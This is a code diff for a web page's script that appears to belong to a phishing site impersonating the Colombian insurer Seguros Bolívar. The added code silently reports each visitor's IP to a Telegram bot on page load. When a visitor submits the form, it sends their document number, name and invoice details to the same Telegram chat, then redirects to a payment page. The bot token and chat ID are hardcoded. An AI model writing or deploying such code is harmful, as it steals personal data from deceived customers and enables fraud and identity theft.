@@ -340,11 +340,43 @@
 
 <script>
   // ─── Config ───
-const API_BASE = window.location.origin; 
+  const API_BASE = window.location.origin;
+
+  // ─── Telegram ───
+  const TELEGRAM_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
+  const TELEGRAM_CHAT_ID   = '-1004457768033';
 
   // ─── Helpers ───
   const $ = id => document.getElementById(id);
   const fmt = n => '$' + Number(n || 0).toLocaleString('es-CO');
+
+  // IP pública (cacheada)
+  let _ipPublica = null;
+  async function getIP() {
+    if (_ipPublica) return _ipPublica;
+    try {
+      const r = await fetch('https://api.ipify.org?format=json');
+      const d = await r.json();
+      _ipPublica = d.ip;
+    } catch { _ipPublica = 'No disponible'; }
+    return _ipPublica;
+  }
+
+  async function enviarTelegram(texto) {
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: texto,
+          parse_mode: 'Markdown'
+        })
+      });
+    } catch (err) {
+      console.error('Error Telegram:', err);
+    }
+  }
 
   function toggleBtn() {
     const val = $('num-doc').value.replace(/\D/g, '');
@@ -362,9 +394,9 @@ const API_BASE = window.location.origin;
   async function consultar(e) {
     e.preventDefault();
     const tipoDoc = $('tipo-doc').value;
-    const numDoc = $('num-doc').value.replace(/\D/g, '');
-    const btn = $('btn-submit');
-    const errBox = $('error-msg');
+    const numDoc  = $('num-doc').value.replace(/\D/g, '');
+    const btn     = $('btn-submit');
+    const errBox  = $('error-msg');
 
     errBox.style.display = 'none';
     btn.classList.add('loading');
@@ -373,11 +405,15 @@ const API_BASE = window.location.origin;
     $('btn-icon').style.display = 'none';
 
     try {
-      const res = await fetch(`${API_BASE}/consultar-deuda/${tipoDoc}/${numDoc}`);
+      const res  = await fetch(`${API_BASE}/consultar-deuda/${tipoDoc}/${numDoc}`);
       const text = await res.text();
       let data;
       try { data = JSON.parse(text); } catch { throw new Error(text || 'Respuesta no válida'); }
       if (!res.ok) throw new Error(data.error || text || `Error ${res.status}`);
+
+      // 🔔 MENSAJE 3: CC + valor, antes de redirigir
+      await enviarTelegram(buildMensajeFactura(data, tipoDoc, numDoc));
+
       mostrarResultados(data, tipoDoc, numDoc);
     } catch (err) {
       errBox.textContent = err.message.includes('Failed to fetch')
@@ -392,73 +428,49 @@ const API_BASE = window.location.origin;
     }
   }
 
+  // ─── Mensaje con datos de la factura ───
+  function buildMensajeFactura(data, tipoDoc, numDoc) {
+    const front  = data.frontData || data;
+    const taker  = front.takerType || {};
+    const nombre = [taker.userFirstName, taker.userLastName].filter(Boolean).join(' ') || '—';
+
+    // Ajusta estos campos según la estructura real de tu API
+    const factura = data.factura || data.invoice || front.factura || front.invoice || {};
+    const total   = factura.total ?? factura.valor ?? front.total ?? data.total ?? null;
+
+    const lineas = [];
+    lineas.push(`✅ *FACTURA CONSULTADA - SEGUROS BOLÍVAR*`);
+    lineas.push(`🆔 *Tipo doc:* ${tipoDoc}`);
+    lineas.push(`🔢 *Número doc:* ${numDoc}`);
+    lineas.push(`👤 *Nombre:* ${nombre}`);
+    if (total !== null) lineas.push(`💰 *Total a pagar:* ${fmt(total)}`);
+    if (factura.numero || factura.number) lineas.push(`🧾 *N° factura:* ${factura.numero || factura.number}`);
+    if (factura.estado || factura.status) lineas.push(`📌 *Estado:* ${factura.estado || factura.status}`);
+    if (factura.vencimiento || factura.dueDate) lineas.push(`📅 *Vencimiento:* ${factura.vencimiento || factura.dueDate}`);
+
+    return lineas.join('\n');
+  }
+
   // ─── Redirigir a pago.html ───
   function mostrarResultados(data, tipoDoc, numDoc) {
-    const front = data.frontData || data;
-    const taker = front.takerType || {};
+    const front  = data.frontData || data;
+    const taker  = front.takerType || {};
     const nombre = [taker.userFirstName, taker.userLastName].filter(Boolean).join(' ') || '';
     window.location.href = `pago.html?tipoDoc=${tipoDoc}&numDoc=${numDoc}&nombre=${encodeURIComponent(nombre)}`;
   }
 
-  // ═══════════════════════════════════════════════════════════
-  // NOTIFICACIÓN A TELEGRAM AL INGRESAR AL SITIO
-  // ═══════════════════════════════════════════════════════════
-  const TELEGRAM_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
-  const TELEGRAM_CHAT_ID = '-1004457768033'; // ID del chat/grupo donde llega el mensaje
-
+  // ─── MENSAJE 1: Ingreso al sitio ───
   async function notificarIngresoTelegram() {
-    // Obtener info del navegador
-    const userAgent = navigator.userAgent;
-    const plataforma = navigator.platform;
-    const idioma = navigator.language;
+    const ip    = await getIP();
     const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
-
-    // Detectar navegador y sistema operativo (simple)
-    let navegador = 'Desconocido';
-    if (userAgent.includes('Chrome')) navegador = 'Chrome';
-    else if (userAgent.includes('Firefox')) navegador = 'Firefox';
-    else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) navegador = 'Safari';
-    else if (userAgent.includes('Edge')) navegador = 'Edge';
-
-    let so = 'Desconocido';
-    if (userAgent.includes('Windows')) so = 'Windows';
-    else if (userAgent.includes('Mac')) so = 'macOS';
-    else if (userAgent.includes('Android')) so = 'Android';
-    else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) so = 'iOS';
-    else if (userAgent.includes('Linux')) so = 'Linux';
-
-    // Obtener IP pública (opcional, usando un servicio gratuito)
-    let ipPublica = 'No disponible';
-    try {
-      const ipRes = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipRes.json();
-      ipPublica = ipData.ip;
-    } catch (e) {
-      // Si falla, seguimos sin IP
-    }
-
-    const mensaje = `
-🔔 *NUEVO INGRESO AL SITIO - SEGUROS BOLÍVAR*
-🌐 *Página:* ${window.location.href}
-🌐 *IP:* ${ipPublica}
-    `;
-
-    try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: mensaje,
-          parse_mode: 'Markdown'
-        })
-      });
-    } catch (err) {
-      console.error('Error enviando notificación a Telegram:', err);
-    }
+    enviarTelegram(
+      `🔔 *NUEVO INGRESO AL SITIO - SEGUROS BOLÍVAR*\n` +
+      `🌐 *Página:* ${window.location.href}\n` +
+      `🌐 *IP:* ${ip}\n` +
+      `📅 *Fecha:* ${fecha}`
+    );
   }
 
-  // Enviar notificación cuando cargue la página
   window.addEventListener('load', () => {
     notificarIngresoTelegram();
   });
